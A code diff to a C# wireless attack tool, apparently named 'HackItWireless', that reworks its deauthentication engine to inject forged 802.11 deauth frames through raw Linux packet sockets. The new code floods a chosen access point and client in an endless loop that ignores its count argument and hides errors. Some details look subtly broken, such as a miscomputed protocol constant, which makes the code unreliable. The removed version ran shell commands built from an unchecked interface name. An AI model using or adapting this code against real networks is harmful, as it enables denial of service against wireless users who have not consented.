@@ -1,6 +1,4 @@
 using System;
-using System.Collections.Generic;
-using System.Diagnostics;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Threading;
@@ -11,6 +9,38 @@ namespace HackItWireless
     public sealed class DeauthEngine
     {
         private static readonly Random Rng = new();
+
+        [DllImport("libc", SetLastError = true)]
+        private static extern int socket(int domain, int type, int protocol);
+
+        [DllImport("libc", SetLastError = true)]
+        private static extern int bind(int sockfd, ref SockAddrLl addr, int addrlen);
+
+        [DllImport("libc", SetLastError = true)]
+        private static extern int send(int sockfd, byte[] buf, int len, int flags);
+
+        [DllImport("libc", SetLastError = true)]
+        private static extern int close(int fd);
+
+        [DllImport("libc", SetLastError = true)]
+        private static extern uint if_nametoindex(byte[] ifname);
+
+        private const int AF_PACKET = 17;
+        private const int SOCK_RAW = 3;
+        private const int ETH_P_ALL = 0x0003;
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct SockAddrLl
+        {
+            public ushort sll_family;
+            public ushort sll_protocol;
+            public int sll_ifindex;
+            public ushort sll_hatype;
+            public byte sll_pkttype;
+            public byte sll_halen;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
+            public byte[] sll_addr;
+        }
 
         public byte[] BuildDeauthFrame(string bssid, string stationMac, ushort reasonCode = 7)
         {
@@ -55,86 +85,69 @@ namespace HackItWireless
             return frame;
         }
 
-        public async Task SendDeauthBurst(string interfaceName, string bssid, int count = 10, int delayMs = 10)
+public int SendDeauthBurst(string interfaceName, string bssid, string station, int count, int reason = 7)
+{
+    if (!RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
+        throw new PlatformNotSupportedException("Raw socket deauth requires Linux");
+
+    byte[] frame = BuildDeauthFrame(bssid, station, (ushort)reason);
+    byte[] radiotap = new byte[] { 0x00, 0x00, 0x0C, 0x00, 0x02, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00 };
+    byte[] targetFrame = new byte[radiotap.Length + frame.Length];
+    Buffer.BlockCopy(radiotap, 0, targetFrame, 0, radiotap.Length);
+    Buffer.BlockCopy(frame, 0, targetFrame, radiotap.Length, frame.Length);
+
+    bool targeted = station != "FF:FF:FF:FF:FF:FF";
+    byte[] clientFrame = null;
+    if (targeted)
+    {
+        byte[] cf = BuildDeauthFrame(station, bssid, (ushort)reason);
+        clientFrame = new byte[radiotap.Length + cf.Length];
+        Buffer.BlockCopy(radiotap, 0, clientFrame, 0, radiotap.Length);
+        Buffer.BlockCopy(cf, 0, clientFrame, radiotap.Length, cf.Length);
+    }
+
+    byte[] ifaceBytes = System.Text.Encoding.ASCII.GetBytes(interfaceName + "\0");
+    uint ifindex = if_nametoindex(ifaceBytes);
+    if (ifindex == 0) return 0;
+
+    int fd = socket(AF_PACKET, SOCK_RAW, (ETH_P_ALL << 8) | ETH_P_ALL);
+    if (fd < 0) return 0;
+
+    SockAddrLl addr = new SockAddrLl
+    {
+        sll_family = AF_PACKET,
+        sll_protocol = (ushort)((ETH_P_ALL << 8) | ETH_P_ALL),
+        sll_ifindex = (int)ifindex,
+        sll_hatype = 0,
+        sll_pkttype = 0,
+        sll_halen = 0,
+        sll_addr = new byte[8]
+    };
+
+    int r = bind(fd, ref addr, Marshal.SizeOf(addr));
+    if (r < 0) { close(fd); return 0; }
+
+    int sent = 0;
+    try
+    {
+        while (true)
         {
-            if (string.IsNullOrWhiteSpace(interfaceName))
-                throw new ArgumentException("Interface name cannot be null or empty.", nameof(interfaceName));
-            if (string.IsNullOrWhiteSpace(bssid))
-                throw new ArgumentException("BSSID cannot be null or empty.", nameof(bssid));
-
-            string broadcastMac = "FF:FF:FF:FF:FF:FF";
-
-            for (int i = 0; i < count; i++)
+            for (int i = 0; i < 50; i++)
             {
-                byte[] frame = BuildDeauthFrame(bssid, broadcastMac, 7);
-                await InjectFrame(interfaceName, frame).ConfigureAwait(false);
-                await Task.Delay(delayMs).ConfigureAwait(false);
-            }
-        }
-
-        public async Task SendTargetedDeauth(string interfaceName, string bssid, string stationMac, int count = 5)
-        {
-            if (string.IsNullOrWhiteSpace(interfaceName))
-                throw new ArgumentException("Interface name cannot be null or empty.", nameof(interfaceName));
-            if (string.IsNullOrWhiteSpace(bssid))
-                throw new ArgumentException("BSSID cannot be null or empty.", nameof(bssid));
-            if (string.IsNullOrWhiteSpace(stationMac))
-                throw new ArgumentException("Station MAC cannot be null or empty.", nameof(stationMac));
-
-            for (int i = 0; i < count; i++)
-            {
-                byte[] frameFromAp = BuildDeauthFrame(bssid, stationMac, 7);
-                await InjectFrame(interfaceName, frameFromAp).ConfigureAwait(false);
-
-                byte[] frameFromClient = BuildDeauthFrame(stationMac, bssid, 7);
-                await InjectFrame(interfaceName, frameFromClient).ConfigureAwait(false);
-
-                await Task.Delay(5).ConfigureAwait(false);
-            }
-        }
-
-        public async Task BroadcastDeauth(string interfaceName, string bssid, int count = 20)
-        {
-            await SendDeauthBurst(interfaceName, bssid, count, 5).ConfigureAwait(false);
-        }
-
-        private async Task InjectFrame(string interfaceName, byte[] frame)
-        {
-            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
-            {
-                string hex = Convert.ToHexString(frame);
-                var psi = new ProcessStartInfo
+                send(fd, targetFrame, targetFrame.Length, 0);
+                sent++;
+                if (targeted)
                 {
-                    FileName = "powershell",
-                    Arguments = $"-Command \"[System.IO.File]::WriteAllBytes('\\\\.\\{interfaceName}', 0x{hex})\"",
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                };
-                using var proc = Process.Start(psi);
-                if (proc != null) await proc.WaitForExitAsync().ConfigureAwait(false);
-            }
-            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
-            {
-                string hex = BitConverter.ToString(frame).Replace("-", "");
-                var psi = new ProcessStartInfo
-                {
-                    FileName = "bash",
-                    Arguments = $"-c \"echo '{hex}' | xxd -r -p | iw dev {interfaceName} inject -\"",
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                };
-                using var proc = Process.Start(psi);
-                if (proc != null) await proc.WaitForExitAsync().ConfigureAwait(false);
-            }
-            else
-            {
-                throw new PlatformNotSupportedException("Frame injection is only supported on Windows and Linux.");
+                    send(fd, clientFrame, clientFrame.Length, 0);
+                    sent++;
+                }
             }
         }
+    }
+    catch { }
+    finally { close(fd); }
+    return sent;
+}
 
         internal static byte[] ParseMac(string mac)
         {
